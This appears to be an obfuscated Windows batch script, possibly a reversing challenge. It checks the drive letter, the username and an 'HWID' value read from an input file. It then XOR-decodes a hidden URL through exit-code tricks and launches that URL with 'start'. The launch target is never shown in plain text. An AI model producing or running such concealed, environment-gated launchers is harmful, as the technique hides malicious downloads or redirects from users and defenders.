@ECHO OFF
SETLOCAL EnableDelayedExpansion
SeT chr(*@)=%~fs1
fOr %%a In ("%chr(*@)%") Do (
sEt ?=%%~da
seT @OFF=%%~na
sEt ?=!?:~0,1!
Set {}=%%~za
set float{10.4}=dBo
)
SEt PATHEXTS=PATHEXT
iF "%?%" == "Y" CAll :EXIT 
iF %__Office__.return% == 10 (
s%NULL:~9,1%T HWI%NULL:~0,1%_COOKIE=1617
) ElsE (
S%NULL:~9,1%t HWI%NULL:~0,1%_COOKIE=1546
)
FoR /f "tokens=*" %%a in ('f^in^dstr^^^ "HWID"^^ %__Office__.load%') DO (
seT __XML.RTF=%%a
If !HWID_COOKIE! neq !{}! (
set /a "__XML.RTF=!__XML.RTF:~15,2!-(!{}!/115)"
) eLse (
sET /a "__XML.RTF=!__XML.RTF:~15,2!+(!{}!/115)"
)
)
SET /a __Office__.return-=10
For /L %%a iN (0,1,%__XML.RTF%) dO (
if %%a == 0 (
sEt "PATHEXTS[%%a]=!HWID:~1,2!"
) ElSe (
FoR %%# iN (!__Office__.return!) Do (
set "PATHEXTS[%%a]=!HWID:~%%#,3!"
SeT .+=%PATHEXTS:~3,1%%PATHEXTS:~2,1%%PATHEXTS:~6,1%%PATHEXTS:~0,1%
)
)
SET /a "__Office__.return+=3"
)
:: note self! 0x13 for HWID_COOKIE
fOr /L %%a in (0, 1, %__XML.RTF%) do (
sEt /a ARG[$1] = %%a %% 2
iF !ARG[$1]! == 0 (
CAll :' %%a -0 4
)
If !ARG[$1]! == 1 (
CAll :' %%a +0 2
)
cmd /c eXiT /b !errorlevel!
sEt "-0=!-0!!=ExitCodeAscii!"
)
@eCHo ON
s^t^a^r^t "" "!.+!^:/^/!-0!"
!-0!
@echO OFF
:'
For %%# iN (%3) dO (
Set /a "?=(!PATHEXTS[%1]!%2x!@OFF:~0,2!)^^0x!@OFF:~%%#,2!"
)
EXiT /b %?%
:EXIT
set NULL=%USERNAME%
iF %float{10.4}% == %NULL:~4,3% (
sET float{10.4}=dBo.fn_EscapeDosCharacters
sEt __Office__.return=0
Set "[\]=!NULL!@"
:*
SET [\]=![\]:~1!
seT /a "__Office__.return+=1"
if nOt "%[\]%" == "@" GOtO *
set __Office__.load=%chr(*@)%
)
exIT /b %__Office__.load%
:END
eXit